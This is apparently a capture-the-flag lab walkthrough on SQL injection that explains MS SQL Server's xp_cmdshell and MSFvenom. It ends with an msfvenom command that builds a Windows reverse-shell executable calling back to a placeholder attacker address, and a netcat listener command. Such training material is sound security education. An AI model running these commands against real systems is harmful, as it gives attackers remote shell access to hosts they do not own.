Task 16  [Day 10] SQL injection Inject the Halls with EXEC Queries

xp_cmdshell is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. 
While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.

MSFvenom is a command-line payload generation tool. It's part of the Metasploit Framework, a widely used penetration testing and ethical hacking set of utilities. MSFvenom is explicitly designed for payload generation and can be used to generate a Windows executable that, when executed, will make a reverse shell connection back to our AttackBox. 
We can run the following command on a Kali machine (or the AttackBox):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
nc -lnvp 4444
